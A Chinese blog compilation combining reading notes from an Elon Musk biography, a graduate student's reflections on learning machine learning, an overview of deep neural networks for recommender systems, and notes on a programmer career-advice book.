在最初的几年，工程师们都很欣赏艾伯哈德迅速而果断的行事风格。特斯拉很少浪费时间过度分析某个问题。公司会选择一项策略，当这项策略在某些方面失败时，团队会迅速承认并接受失败，然后迅速做出调整并更换一项新的策略。真正拖延Roadster研发进度的，是马斯克想要实现的种种改动。马斯克希望车子具有更高的舒适度，要求对座椅和车门做出调整。他将碳纤维的车身放在了首位，然后要求在车门上安装电子传感器，这样一来，人们便可以通过手指触摸而不是拉动手柄去解锁。

第八章 痛苦、磨难与新生：现实版钢铁侠的商业版图
在唐尼看来，影片中的主人公史塔克和马斯克是同一类人，他们“一旦抓住一闪而过的创意，就为自己的想法倾其所有”。他们一秒都不会浪费。


莱莉还是处*女，而马斯克告诉她他想给她看看自己的火箭。“我心存疑虑，但是他真的就只是给我看了几段火箭的视频。”莱莉回忆道。在马斯克返回美国后的几周里，他们一直互相发邮件保持联系，不久，莱莉便买了前往洛杉矶的机票。


当马斯克浏览SpaceX和特斯拉的财政状况时，发现只有一家公司有机会存活下来。“我只能选择SpaceX或者特斯拉中的一个，或者将资金分成两半，”马斯克说，“这是一个艰难的决定。如果我将资金分开，可能两家公司都没法活下来。如果我将资金全都给其中一家公司，它生存的概率会更高，但这也意味着另一家公司肯定要倒闭。我为此翻来覆去思考了许久。”就在马斯克苦苦思索时，美国的经济环境急剧恶化，马斯克的财政状况变得更加艰难。而当2008年进入尾声时，马斯克的钱用完了。

深谙游戏规则的马斯克决定虚张声势。他告诉投资人他可以再次从SpaceX借4000万美元来完成这轮融资。他的战略奏效了。“如果机会变得稀缺，那么自然而然，人就会变得贪婪并且更感兴趣，”尤尔韦松说，“这也更便于我们回到公司说，‘现在情况就是这样，投还是不投？’”这轮融资最终完成于圣诞前夕，再迟几个小时特斯拉可能就要宣布破产。当时马斯克只剩下几十万美元，甚至无法第二天给员工支付薪水。最终，马斯克为这轮融资贡献了1200万美元，剩下的部分都由投资公司提供。对于萨尔兹曼的行为，马斯克说，“他应该为此感到羞愧后悔。”


第九章 腾飞：被颠覆的航空业
为了不让火箭坠海损毁，SpaceX会应用反向推进器，使火箭缓缓下落，然后回收。在未来的几年内，SpaceX预计将价格降至对手的1/10。火箭可回收是价格得以降低的主要原因，同时也将使SpaceX形成强大的竞争优势。试想一下，一家航空公司可以使用同一架飞机执行多次飞行任务，而其竞争对手的飞机每次飞行结束就报废了。[插图]凭借其成本优势，SpaceX有望承揽全世界大部分的商用发射任务，而且有证据表明，公司正在朝这个目标挺进。
俄罗斯在载人载物航天业务中占有重要地位，却还在使用几十年前的旧设备。他们用于前往国际空间站的“联盟”号载人太空舱，体积狭小，其机械旋钮和电脑屏幕自1966年首次飞行以来从未更换过。新加入太空竞赛的国家却精确地模仿了俄罗斯和美国的旧设备。航天业的现状令进入该领域的年轻人啼笑皆非，而实际的工作环境也如同那些机器一般古板陈旧。一直以来，那些能力出众的大学毕业生不得不在慢节奏的军工承包商和有趣但缺乏影响力的初创企业之间做出艰难抉择。
对于那些解决了难题、在面试中的表现可圈可点，并写出好文章的候选者来说，他们获得的奖励就是有机会和马斯克面谈。SpaceX的前1000名员工，包括门卫和技工，几乎都由马斯克亲自面试。随着公司员工队伍不断扩大，他仍然亲自面试工程师。在与马斯克面谈之前，每位候选人都会被告知面试时间可能会持续30秒至15分钟。在面试刚开始的时候，埃隆有可能继续写邮件和工作，不会讲太多话，不要惊慌，那很正常。最后他会转过椅子面对着你，即使这样，他也不一定会与你有眼神交流，或和你打招呼，不要惊慌，那很正常。他会在恰当的时候和你讲话的。
这座工厂是SpaceX的神庙，供奉着被视为其在火箭竞赛中的主要武器——内部制造。SpaceX自己完成了80%～90%的制造工作——包括火箭、发动机、电子设备和其他部件。这是一个让SpaceX的对手瞠目结舌的策略。以联合发射联盟（ULA）为例，它曾公开吹嘘自己有1200多个供应商来协助制造最终产品。ULA是洛克希德·马丁公司和波音公司的合营公司，自恃为创造就业机会的机器，而不是效率低下的典型。典型的航空航天公司会提出发射系统所需的零件清单，然后把设计和规格交给众多的第三方制造商，由它们负责制造。而SpaceX倾向于尽可能减少采购，一方面是为了省钱，另一方面则是因为它认为依赖供应商，尤其是外国供应商，是一个缺点。 这个做法乍一看不那么明智——其他公司制造如无线电设备和配电系统已有数十年，全盘重新生产火箭上的每一台计算设备和机器，可能会增大出错的概率，而且通常会浪费时间。但是对SpaceX来说，这个策略是奏效的。除了制造自己的引擎、火箭箭体和太空舱，SpaceX还设计了自己的主板、电路、探测震动的传感器、飞行计算器和太阳能板。工程师发现仅仅是精简一个无线电装置，就可以将设备的重量减少20%。而自产无线电节省的成本更是令人瞠目，其他航天航空公司使用的工业等级设备需要花费5万～10万美元，而SpaceX将其降到5000美元。

SpaceX的一些设备和技术已经转移给特斯拉，希望特斯拉很快就能产出更轻、更坚固的汽车，这促使马斯克在汽车行业里的竞争对手们不得不采用相同的技术。事实证明，这项技术极具价值，以致SpaceX的对手开始竞相效仿，并试图挖走一些SpaceX公司在该领域的专家。杰夫·贝佐斯悄悄创建的火箭公司蓝源公司（Blue Origin），就曾经明目张胆地挖走了世界顶尖搅拌摩擦焊接专家雷· 米耶科塔（Ray Miryekta）。这件事就此拉开了贝佐斯与马斯克纷争的序幕。


在SpaceX公司成立早期，马斯克对于制造火箭所需的机器设备一无所知，也不了解建造火箭所需的繁重工作有多少。他回绝了多个购买专用模具设备的申请，在工程师清楚地解释他们为什么需要某种设备，以及他自己从中了解相关原理之后，才批准采购申请。马斯克也尚未掌握一些后来使他声名远扬并且在一定程度上甚至使其臭名昭著的管理技巧。随着SpaceX日渐成熟，马斯克也成长为一名真正的CEO和火箭专家。

马斯克聘请了数百位聪明且有上进心的员工，他要将个人潜力的发挥最大化。他一天工作16小时，比两个人每人工作8小时更有效率。原因是一个人不需要开会、不需要与谁达成共识，也不需要在项目中帮助其他人。他只需要持续地工作、工作、再工作。

正如肖特维尔所说，SpaceX公司的最主要目标，就是尽可能提高发射频率。公司从来不指望一次发射大赚一笔。它宁愿每一次发射只赚一点并通过多次发射形成良性循环。“猎鹰9号”的飞行成本为6000万美元，公司希望通过规模效益和改进发射技术将这一数字降至约20万美元。SpaceX总共花费了25亿美元将4个“龙”飞船送到了国际空间站，执行了9次“猎鹰9号”和5次“猎鹰1号”的发射任务。每次发射的价格是同行业中其他公司所无法理解的，更是难以企及的。

马斯克和米勒的设计有一个巧妙之处：从“猎鹰1号”到猎鹰重型火箭，所有型号都可以使用相同的引擎，从而节省成本和时间。 米勒说，“我们自主生产燃油缸、涡轮泵、气体发生器、喷射器和主阀门，我们对成品有绝对的控制权。我们还有自己的实验基地，而绝大多数竞争对手使用的是政府的实验基地，因而我们的工时减少了一半，与生产材料相关的工作也少了一半。

第十章 电动车的复仇：毫不妥协换来最好的时机

无论是对于工程师还是普通大众来说，Model S都是效率的典范。传统汽车与混合动力汽车有数以千计的运动部件。发动机为了持续提供稳定的动力，需要曲轴、机油过滤器、交流发电机、风扇、分电盘、阀门、线圈和气缸等零部件配合。而发动机产生的动力，需要通过离合器传递到齿轮与传动轴来驱动车轮转动，这个过程中产生的废气需要由排气系统进行净化处理。在将汽油转化成推动力的过程中，普通内燃机车辆只能将燃料效能的10%～20%转化为动力。大部分能量（约70%）以热辐射、对抗风阻、制动摩擦等其他机械功能耗散掉了。而Model S相反，它有一系列运动部件和电池组相互配合，可以持续不断地将能量输出给西瓜大小的发动机来驱动车辆，电能利用率可达60%，剩余能量大部分以热损耗的形式散掉了，Model S的性能相当于每加仑汽油可行驶100英里的传统汽车。

特斯拉通过招聘绝顶聪明的员工来弥补研发资金上的短板，与绝大多数汽车公司依赖的第三方服务商相比，这些员工无论在敬业程度或聪明才智上都更胜一筹洛伊德说：“我们相信，在工程师里面，一个佼佼者远胜于三个平庸之辈。”几个特斯拉工程师组成小分队开始探索和构思Model S内部机械结构，他们探索之旅的第一站便是当地的奔驰代理商。他们当场试驾了CLS系列4门跑车和E级轿车，这些车的共同点是使用相同的底盘。工程师们对每辆座驾的每一部分都进行了仔细测量和记录，并分析利弊，最后总结出CLS系列略胜一筹，并以此作为设计Model S的基准点。

特斯拉开始和亚洲制造厂紧密合作，一方面努力完善他们当时尚未成熟的电容式触摸技术，另一方面寻找把线路隐藏在屏幕背后的最佳方案，从而实现灵敏触屏。“我确信我们做出了世界上第一款17英寸触屏系统，当时没有一款电脑，包括苹果产品在内，可以实现这种规格的大屏幕触屏操作。”


生产一辆车要经过很多烦琐工序：首先要有冲切机把铝片切割成车门、引擎盖和车身，需要冲压机和金属模具把铝材铸造成特殊形状，然后需要十几个机器人组装部件，还需要电脑程序控制的铣床进行精细金属加工，以及喷漆上色仪器和一系列安全测试仪器。此外，工厂还需要额外雇用几千名人工人，前期的开支动辄上亿美元。马斯克希望特斯拉像SpaceX一样搭建内部生产线，尽可能自主完成生产，但高昂的成本令特斯拉难以承受。


果然不出所料，2010年1月能源部便与特斯拉签下了4.65亿美元的贷款协议。尽管这笔贷款的金额远远超过了特斯拉的期待值，但一般情况下要把一款新车推向市场起码需要10亿美元的资金，而这笔政府拨款不过占其中的零头。

精明的工程师们学会遇到问题的时候必定先竭尽所能找出可能的解决方案
马斯克做到了许多竞争对手错过了或者无法实现的创举，那便是使特斯拉成为一种生活方式。特斯拉卖的不仅仅是汽车，而是一种对未来的大胆想象，一种对科技创新的信任感，正如10年前苹果推出Mac电脑，以及日后的iPod和iPhone产品一样，除了苹果狂热支持者以外的普通消费者也会在买了苹果产品和下载iTunes等苹果软件后不可自拔地成为苹果生态圈里的一分子。
如果没有对每一个细节的严格把关，很难实现与用户建立这样紧密的关系。比如个人电脑制造商常常把各环节分散外包，软件外包给微软，芯片交给英特尔，设计则来自亚洲的厂商，他们永远无法制造出像苹果电脑一样美观又功能齐全的产品。苹果可以做到把专业技能投入到开发大众喜爱的软件产品上，但传统的电脑商家是无法对此做出灵活反应的。

“我们的最终目标是在车卖出去以后便再也不需要对其进行维修。而经销商们则是通过返修和赚取零件的差价来获得利润，顾客为了避免麻烦也常常愿意支付额外的费用让经销商修车。而特斯拉的利润来自一次性的销售收入以及可供选择的收费软件服务。这是截然不同的服务理念。”


人们很容易忘记制造电动汽车从一开始就是一门不被看好的生意，风险投资人都不愿意投资这类项目，以免招来麻烦。让特斯拉得以领先对手的原因是团队有充足的能力和魄力，毫不妥协地执行马斯克提出的标准，分毫不差地达成当初设定的目标。


第十一章 埃隆·马斯克的统一场理论：下一个10年
和马斯克的其他风险投资一样，太阳城更多地表现了他的世界观，而非商业机会。 马斯克很早以前就通过非常理性的思考认定太阳能是一个可以商业化的行业。太阳在一个小时内照射在地球表面上所发出的太阳能，相当于全世界一整年的能源消耗总量。太阳能板的效率正在稳步提升。如果太阳能注定是人类未来首选的能量来源，那么这一未来应该来得越快越好。


“截至2010年，一辆普通四门轿车的电子控制系统所需要的代码数，比操控一架最新款的波音喷气式客机所需要的代码还多，”


SpaceX是未来几十年美国想要和中国一较高下的唯一希望。
至于机电一体化设备，SpaceX和特斯拉已经率先将电子、软件和金属融合在一起，他们的竞争者们正在努力追赶。马斯克的所有公司，包括太阳城，已经充分利用了垂直整合方式，把部件的内部控制变成了一项真正的优势。


他希望能够和马斯克合作，制造一台能够带上火星的DNA打印机。理论上，它能够让首批登陆火星的人类自己生产药品、食物和有用的微生物。“我认为，只有生物远程传送机才能真正做到太空殖民，”他说，“埃隆已经和我讨论过怎么去做了。”



简评：
作为未来几十年美国想要和中国一较高下的希望之星。马斯克这个硅谷实业明星企业家实在太值得我们学习了










作者：一人
2013年9月7号，我和母亲两个人到达了西安，我一手拉着箱子，上面放着本科时候用的旧褥子被子，母亲手提着放满衣服的提包，两个人穿梭于林立的高楼当中。母亲看护行李，我办理手续，直到下午很晚的时候，才在城西送母亲坐上了回家的大巴车。就这样，开始了我的研究生求学生活。
研一开始选择导师，我没有像很多同学那样提前联系导师，因此误打误撞的选择了老L。那年，我听说老L给院办公室叮咛说要选几个男学生，因此那一届我们三个就都是男生了，后面见到高一级同门才明白为什么，原来上面是三个师姐，呵呵哒，三个青壮年啊哈哈……。接下来面临的就是选课，当我们拿着选课单找老L时，老L扶了一下眼镜笑嘻嘻的说：选这些课就是为了拿学分，顺利拿到毕业证，上课无足轻重，重点是能够发文章。我们潜意识当中那个得意的笑啊，老师的指导牢记在心，上课一句话，就是混。

老师很忙，一学期下来就只有一两次谈话，感觉老师就是“牧师”，我们就是一群羊。结果呐，研究生一年级大半的时间荒废掉了。啊，啊，啊，啊，啊，后来啊，我的肠子都悔青了。怎么荒废的？这你还问？
一直到研一第二学期期末，有一门课《模式识别》由汪茜利教授讲授，最后两堂课对我们提交的作业进行讲授，汪老师的高一级的学姐张硕（是的，记得很清楚，学姐嘛）讲解了通过使用SVD分解进行人脸识别。我很好奇内心惊呼，这都可以，这竟然可以，下课后抱着强烈的疑惑去问她，细节部分她也没能回答上来。回到实验室，我自己就开始查资料，看博客，逐渐发现《模式识别》的内容也挺有意思的，随着了解的深入很快意识到这门学科的重要性。在这之后，我通过微博关注了大量这方面的专家，每天都会看这些专家们在讨论什么，经过长时间的积累帮助甚大，现在已经成为我获取新信息的重要渠道之一了。说来也巧，那段时间有一位博士毕业，请来了清华大学的孙茂松教授，他顺道给我们做了一场报告，具体的内容我已经不大能够回忆起了，有两点记忆深刻：第一，他谈到了图灵测试，在场的大多数学生不知道，老师很是震怒，我亦感受到很大的耻辱，颇受打击；第二点，他谈到了在学术界很火热的深度学习，然而我们学院里面没有几个老师听过这个东西。当我给老L谈起深度学习，他说这个不是已经很老的东西了吗！可见学院里面的老师已经很OUT了。就在那个时候认清了自己，认清了自己所处的环境。在此之后，我就坚定自己一定要从外面获取信息，不能一味的听取导师的意见，要将视野放在整个领域，不能只局限在学院和导师的范围。
（男同学们，看来要常问师姐问题哦……）
在接下来几个月的时间里，我每天上微博，每天刷知乎，看看大家怎么学习，都在学习什么。发现机器学习的方向很是火热，恰好和自己感兴趣的模式识别很相似，就开始了自己真正的学习生活。
上斯坦福的CS299、coursera的机器学习、李航的《统计学习方法》，《机器学习实战》等一系列，在微博上知道了LeetCode，后面也花了一两个月在上面刷编程题，在后面的面试求职过程中帮助很大。
在整个过程中有以下几点比较遗憾： 
- 导师说我们开设的课程无足轻重，主要是发论文。在后来看来，我最大损失就是没能好好上这些课程，这些课程是整个计算机科学的基石，没有这些课程的正规训练自己的路很难走的顺利。因此在研二的时候花了大量的时间去弥补这些缺失，但也只是挽回了很小的一部分。现在依然觉得没能学到那些知识是最大的损失。

《人工智能》《机器学习》《模式识别》《计算机视觉》《随机过程》《组合数学》《图论》《数字图像处理》《小波分析》等等，现在看看，随便的一门课学精都是几十万的工作啊。


导师的方向很偏，国内也很少人研究。老师给我定的方向已经很成熟了，我很难找到新的点，唉！
感兴趣的地方没有人指导，自己也没有很好的学习方法，因此只能获取片面的信息，学习效率低下。
荒废研一，研二补，造成在发论文和找工作上吃亏。 
在后面时间随着对机器学习认识的深入，逐渐认识到这个行业将会繁荣发展，那个时候对于深度学习对图像行业的变革自己也清醒的认识到了。但是窘迫于自己的功力不足，只能先找到相符的方向之后，再说其他好的公司，因此就签约了现在这家传统国有企业。


自己一概莫有问题，哈哈

三年的时间很快就过去了，在那里认识了很多优秀有趣的同学，他们也给了我很大的支持和照顾。其他方面有时间，另开一篇吧。
在我离校要走进地铁站的那个时候，我给大师兄说：三年，有得有失，总体还是及格，还算满意吧！

特别鸣谢：大师兄的驾驶技术还是不错de，虽然去地铁站十多分钟的路程开了二十多分钟哈

选方向，明不足，结交优秀风趣的朋友，乃最大收获。
现在回来看看，研究生到底应该怎么过，对于普通的大多数：

研一要认真上课，努力认真完成各科作业，并做课程的知识拓展。


斯坦福的学生平日很忙，偶尔会通宵学习的哦，你应该知道需要怎么认真了吧。


从研一暑假开始，确立方向认真研究半年出论文。


课程给予广泛的视野，在经过几个月深入到一个领域，一篇毕业水论文应该是很容易。很多老师让学生刚开始就忽视基础【咣咣，敲黑板啊】，只关注研究领域，真的是种舍本逐末的行为，这样的结果就是一辈子只能给别人填坑，而且大多的研究成果都是垃圾，最后获得吃力不讨好的结局。


研二第二学期出外实习。


如果你打算硕士毕业就就业，那这一环节就很重要，建议选择和自己今后从事的工作方向相符的实习岗位，否则待在实验室好好学习也不错。


研三找工作。


很多人很多情况，这里就无法叙述了，只能因时因人因事而具体讨论。 

最后，列举一些需要长期积累的东西： 
- 要有科学合理的学习方法 
- 培养合理的学习习惯 
- 建立独特的信息获取渠道 
- 寻找自己的专业导师队伍和人生导师队伍
如果你还是觉得干货不足，那我就罗列一下微软的人才评价标准，大家细细玩味： 
- 迅速掌握新知识的能力 
- 仅需片刻思考即可提出尖锐问题的能力 
- 可以在不同领域的知识中找出它们之间的联系 
- 扫视一眼即可用通俗语言解释软件代码的能力 
- 关注眼前的问题，不论是否在工作中都应如此 
- 非常强的集中注意力的能力 
- 对自己过去的工作仍然记忆犹新 
- 注重实际的思想观念、善于表达、勇于面对挑战、快速反应

满足两项以上的请举手，大家一起做朋友。
 









作者：一人
1.深度神经网络对于任何领域都是适用的
 
深度神经网络（Deep Neural Networks, 
    DNN）在过去的数年已经在图像分类、语音识别、自然语言处理中取得了突破性的进展。在实践中的应用已经证明了它可以作为对于一种十分有效的技术手段应用在大数据相关领域中。深度神经网络通过众多的简单线性变换层次性的进行非线性变换对于数据中的复杂关系能够很好的进行拟合，即对数据特征进行的深层次的挖掘。因此作为一种技术手段，深度神经网络对于任何领域都是适用的。

2.推荐系统简介
推荐系统的功能是帮助用户主动的找到满足偏好的个性化物品并推荐给用户。在本质上可以当做一个个性化的搜索引擎，输入的数据为用户行为信息、偏好信息等，返回的结果为最符合查询条件的物品列表。数学化的表示：
物品列表=f(用户偏好)−−−−−−−−−−−公式（1）
物品列表= f\left( 用户偏好\right)-----------  公式（1）

我们的推荐引擎就扮演者这里的函数的角色，它主要需要完成两部分的工作：
A > 针对查询条件对物品的相关性进行估计。
B > 晒选出topN个最相关的物品。
因此，推荐系统的关键就是对上面函数的一种求解。

实际应用中的物品数量很大，因此在满足业务需要的前提下，对于所有物品使用评估函数进行评估是不实际的。因此为了实现性能与效果的平衡，大多的推荐系统将以上的计算过程分为两个部分：

推荐召回
推荐排序


推荐召回指在所有物品集合中检索到符合用户兴趣的候选集，大约筛选出几百个候选的列表。排序的目的是要利用展示、点击（或转化）数据，然后加入更多的用户、物品特征，对推荐候选进行更精细的修正、打分。这种模式另一个好处是能够利用多种候选集。

因此，推荐系统需要完成两步计算：候选集生成和排序，这两阶段的估计函数分别表示为g和h，即有:

f=g(h(x))−−−−−−−−−−−−−−−−−−−−−−−−−公式（2）
f= g(h(x))-------------------------公式（2）



3.使用神经网络近似求解函数参考1
对于函数的求解大多分为以下几种途径：

确定性求解：通过对数据的规律进行建模直接求解。
确定性近似求解：通过变分推断的相关方法进行求解，EM。
随机性近似求解： 通过采样的方法对函数进行求解，蒙特卡洛方法。
非结构化求解

不管这个函数是什么样的，总会有一个神经网络能够对任何可能的输入 xx 网络可以得到对应的值 f(x)f(x)（或者某个足够准确的近似）
即使函数有很多输入或者多个输出，这个结果都是成立的，f=f(x1,...,xm)f=f(x_1,...,x_m) 。例如，这里有一个输入为 m=3m=3 和输出为 n=2n=2 的网络： 

综上，神经网络作为一种近似化求解方法可以用来对于公式（2）两个函数g, h进行近似。

4.推荐召回

Google利用DNN来做YouTube的视频推荐其模型图如下图所示。通过对用户观看的视频，搜索的关键字做embedding，然后在串联上用户的side 
information等信息，作为DNN的输入，利用一个多层的DNN学习出用户的隐向量，然后在其上面加上一层softmax学习出Item的隐向量，进而即可为用户做Top-N的推荐。 

Autoencoder(AE)是一个无监督学习模型（类似矩阵分解），它利用反向传播算法，让模型的输出等于输入。利用AE来预测用户对物品missing的评分值，该模型的输入为评分矩阵中的一行(User-based)或者一列(Item-based)，其目标函数通过计算输入与输出的损失来优化模型，而评分矩阵中missing的评分值通过模型的输出来预测，进而为用户做推荐,其模型如下图所示。后续，Denoising Autoencoder(DAE)是在AE的基础之上，对输入的训练数据加入噪声。所以DAE必须学习去除这些噪声而获得真正的没有被噪声污染过的输入数据。因此，这就迫使编码器去学习输入数据的更加鲁棒的表达，通常DAE的泛化能力比一般的AE强。Stacked 
Denoising 
Autoencoder(SDAE)是一个多层的AE组成的神经网络，其前一层自编码器的输出作为其后一层自编码器的输入。还有Bayesian 
SDAE等等众多方法均同源于此。 



5.推荐排序

Wide & Deep 模型，Google利用DNN和传统广义线性模型结合的方式实现对于Google Play 
中的应用进行推荐。 
DNN具有很好的泛化性而广义的线性模型具有很好的记忆性，通过将二者结合，在实现很好的泛化性基础上对于不相干的物品规则进行了抑制。在输入层将类别特征通过embedding和连续值进行连接形成输入的嵌入向量并通过三层的网络形成输入的隐向量，并在输入层将app相关的特征进行交叉相乘，连同隐向量输入一个逻辑输出单元中，最终输出对于特定app的评分。 



6.神经网络其他应用

词向量表示，使用浅层神经网络方法进行学习。利用序列数据中蕴含的信息，将物品的表示由高维稀疏表示映射到低维密集表示。典型的模型方法有：word2vec 
[无监督]和GloVe[无监督] (Global Vectors for Word Representation)。 
——————————————————————————————————– 
下图展示的是基于CBOW层次网络结构的word2vec，输入层是若干个词的词向量，通过映射层进行累加，输出层中黄色节点是非叶子节点代表一个类别，而叶子节点代表一个词向量，整个输出层是一个霍夫曼树。假设对于特定的上下文，特定的中间词的预测概率最大，进行训练得到词的低维密集表示。 
——————————————————————————————————– 
例如：语句“直接修改此文件”，分词后有“直接”，“修改”，“此文件”。那么对于词“修改”进行训练，那么输入的上下文就是“直接”、“此文件”，我们期望“修改”的概率最大。通过使用大量样本训练后，可以在叶子节点训练得到对应词的向量表示。之后，可以计算词向量之间的相似性来代表词之间的相似性，诸如此类对进一步的分析提供方便。 
——————————————————————————————————– 



7.神经网络的难点
由于神经网络用多层结构拟合复杂的非线性关系，具有庞大的参数，并且随着网络的深入进行训练愈发困难。因此对于实际中的应用具有以下难点：

需要大量的训练数据
调参不存在合理的选择方法
对于具体应用不存在标准的网络结构

8.当前数据应用深度模型面临的挑战

用户行为稀疏，因此数据中存在大量的噪音
媒体库数据可用字段较少
用户画像杂乱，用户属性信息采集不明确


总结
以前，计算资源宝贵，并且计算能力偏弱，因此为了实现智能化功能，需要研发人员将功能规则通过人为的方式间接的融入进算法当中，以此来减少计算量。但是由于用户的应用场景繁杂，因此往往存在着众多研发人员无法预估的情况。而且由于很多的近似求解方法需要得到精确地结果需要大量的计算而迫使多数应用场景无法实现和采用，因此在过去的数年间，应用层面的智能化发展停滞不前。而随着计算能力的迅速发展，利用大量计算实现智能化的功能已经成为可行策略。而深层神经网络算法以其强大的拟合能力就是适应了这种发展趋势，迅速的在图像、语音、自然语言等领域取得了巨大的成就。
个性化推荐作为众多智能场景中的一员，已经吸引了众多的研发人员投入其中，不同于图像、语音等具有丰富的特征且算法结果和真实样本不会产生互相影响，由于推荐中特征数据的繁杂，且推荐的结果影响着采集到的数据，目前推荐当中并不存在一种通用型的结构和方法。也有很多人将神经网络的方法应用在整体推荐的子领域当中已经取得了不错的效果。可以预见随着更多的人员参与进来，个性化推荐必将被神经网络的方法所侵占。
在工业中，在有限的资源投入的情况下，紧跟技术前沿的发展，将先进的方法在系统当中进行验证。或者对于行业取得稳定效果的方法进行验证并进行系统集成，产品将会获得巨大的收益。
附：
Word2vec 效果【节目vec之间的相似度】：

碟中谍5：神秘国度


【 # 危机13小时，# 碟中谍4，# 死亡飞车，# 极限特工2，# 虎胆龙威5，# 
    星际穿越，# 丛林奇兵， # 刺客联盟， # 谍影重重2， # 非常人贩】


86版西游记


【# 西游记动画片，# 西游记之锁妖封魔塔，# 西游记之大闹天宫(3D)，# 
    西游记之大闹天宫，# 西游记之孙悟空三打白骨精， # 嘻游记， # 
    西游记之大圣归来， # 西洋镜， # 电哪咤， # 孙悟空七打九尾狐 】


射雕英雄传


【# 射雕英雄传 第3集，# 射雕英雄传 李亚鹏版，# 神雕侠侣，# 
    神雕侠侣[粤语版]，# 天龙八部， # 方世玉与胡惠乾， # 倚天屠龙记大结局， # 
    新神雕侠侣， # 神雕侠侣黄晓明版， # 天涯明月刀】

 









 
 
张大志著 

书有历史了，在我上大学的时候，雷总就看了这本书。如果能在上学期间就接触到书中关于工作选择的内容，那么就可以早早的有的放矢，成为企业需要的人才，并且最重要的是避免被企业忽悠！。
内容主要看了职场部分，还是很有点启发的。

前言
想改变规则吗？那么首先是全面地了解它，然后把规则运用得比制定它的人还要好，之后我们才有资格来改写、重写规则。百尺竿头站脚，千层浪里翻身；
来自微软十大IT英雄的推荐
其实所有励志著作的核心内容都只有一句话：“只要努力，便可成功”。

初入职场——程序员的职场成长

这种受累不讨好的活儿是很难做得很开心的。对于我们而言，能做的只是给导师足够的尊重，尽可能表达我们的谢意。尽力学习，表现自己的能力。 
永远记住，工作中没有什么事情是理所当然的。
尽早感受一下无奈和失败，以提高我们的耐力、磨炼我们解决问题的思路吧！尽早了解失败、明白失败的意义，并不是件坏事。
早日明确我们对利益的态度，有助于我们掌握自己在社会上的行事作风。


第2章 四招找到好工作

即我们想做又能做的事情。在这方面我们既有兴趣又具备做好工作的能力。
倒序——从最近的一份经历开始写；（符合阅读习惯。如果我们换过几次工作，招聘方还是希望看到我们在目前的公司或者最近一家公司的工作内容）
换工作的目的，就是为了让自己工作得更快乐，更有幸福感。
我要在的部门会成长到什么规模？我将有何种成长空间？(面试时候对面试官的提问)
面试时，时刻提醒自己：

（1）我在这次面试当中，有什么需要提高或者改进的地方？（每次面试都应该让自己有所收获和提高） 
  （2）公司是如何看待（定位）我要从事的职位的？（抓住机会进一步了解公司对该职位的期望） 
  （3）如果我有幸通过今天的面试，大概多久可以收到复试的通知？（表明对进入公司的渴望） 
  （4）最后，再次提醒自己的薪水底线，即“低于多少就不考虑相关工作机会了”。



第3章 初入职场第一年

是浑浑噩噩地在工作中消磨自己的生命，还是找份能让自己的能力发光的工作，选择权在我们自己手里。
有没有在相同纬度上的不同工作任务，比如：开发项目中，新加入的程序员是否有机会尝试从需求分析到代码开发，直至上线测试、集成测试的工作。
请永远记住“社会与学校有很大的差别，主要的一点是不能不高兴就走人！”
没有开放的心态，我们就只能每天不开心了。对不开心的事，除了有开放的心态之外，我想还应该用职业化的态度来对待，不喜欢的同事请保持同事关系，我们永远不会是朋友；不喜欢的公司要问一句能不能让自己在工作中有所长进，如果回答是肯定的，那么别犹豫努力做好；不高兴的时候可以休假，去找朋友聊聊天，看看书，调整一下自己的情绪。
销售的巧言令色、前台的和颜悦色里面都包含着职场生存的智慧，用心体会和学习，为自身所用。只有尊重经验、尊重阅历，才能少走弯路。
是否具有良好的企业文化、是否能为今后的履历加分、是否有不同的工作任务。
每名研发人员的试用期都应该是至少一年
想一想，工作为什么？工作狂会说，工作是为了更好的工作；正常人会说，工作是为了更好的生活。掌握工作和生活之间的平衡是每个人职业生涯中必不可少的一课


第4章 正确判断公司情况

人无压力轻飘飘是有理论依据的，科学实验证明，在适度的压力下工作，有助于我们的快速成长。
大可不必为此伤害我们工作的热情和良好的心情。
认清了公司的形势，掌握工作中不同的人对我们的影响程度，正确判断公司的情况之后，我们要做的就是努力工作，开发好每行代码、认真完成每项测试，让自己的努力尽早展示出成果


第5章 正确面对职场压力

庄子说：“吾生也有涯,而知也无涯,以有涯随无涯，殆已。”把我们的工作与生活之间人为地画一条线，清晰地把它们分开。工作和追求知识不是我们生活的全部，生活中还有很多美好的东西等着我们。原则上8小时工作时间以外是我们自己的时间。加班也有个下班的时候，下了班的时间就是我们自己的。充分地享受生活，享受属于我们自己的时光。


第6章 程序员与劳动法

工资条、收入证明和离职证明是我每个员工早晚要从HR手里拿到的三样东西。
渐入佳境——成熟並非遥不可及
保持良好的心态最重要。好的心态能让我们走得更远、更开心！
看着钱的面子完成所有本职的工作
一种态度叫做事业，即力所能及地把工作做得最好，把公司的事当成是自己的事
想事业有成，那首先要做到的就是把自己的本职工作做到最好，额外付出些努力，同时也额外得到些回报
程序员所擅长的沟通是与客户沟通真实需求、与牛人沟通学习心得、与朋友沟通成长所得


第8章 加钱、加钱、加钱

我希望试用期 1500 元/月，转正之后再谈。（作者为了证明自己实力，哈哈）
薪水是非常重要的因素，但不是工作中我们唯一需要考虑的因素，请全面评估之后作出自己的选择。有时，我们还是值得在目前位置上坚持一下的。
即使我们不擅长提要求，那么每半年总结一下自己工作中取得的成绩发给相关领导
新的工作机会薪水增加在25%~30%之间是比较正常的。低于25%的增长除非有其他更好的理由。每个工作的转换都或多或少有转换成本（路途远近、新同事关系等），增长的薪水是用来弥补这些成本的，
大家更在意的是十年里我们所做的工作、我们的进步和取得的成绩。
工资，不仅仅是我们个人价值的体现，更重要的是，它是我们生活幸福、梦想成真的魔术棒。


第9章 职场转型与跳槽

《庄子》里说：“吾生也有涯，而知也无涯，以有涯随无涯，殆已。”每个人的生命都是有限的，不要浪费在无谓的追逐中。
中高级职位，公司很少放在网上。从公司角度更相信内部推荐或者内部提拔的可靠方式。
拓展人脉，我建议你多参加商务聚会，这样成本更低。 


第11章 程序员与猎头

“东家，外面风大、雨大，我有去闯的心，真不成俺还回来继续好好干”
猎头行业永远是一个晴天送伞的行业
还有一种相对间接，但可能更容易被客户接受。那就是告诉客户，我能帮你把在公司里你看不顺眼的人“铲走”（挖走），让你眼前清静。后者，就是所谓的“猎头陷阱”。
“不行春风，莫望秋雨”


第13章 创业者的话，别全信

创业之前，应该看看自己有什么？什么是自己擅长的？能为世界做什么？有什么样的社会资源可供自己在创业时使用？没有收入自己能坚持多久？自己是否只擅长技术？有没有好的合作伙伴可以在创业中互补？
薪酬始终包括两部分：为技能而支付的，为忠诚而支付的。
如果非要说创业成功有什么诀窍，那我认为确实有一点：正确的坚持

羊皮卷的实践
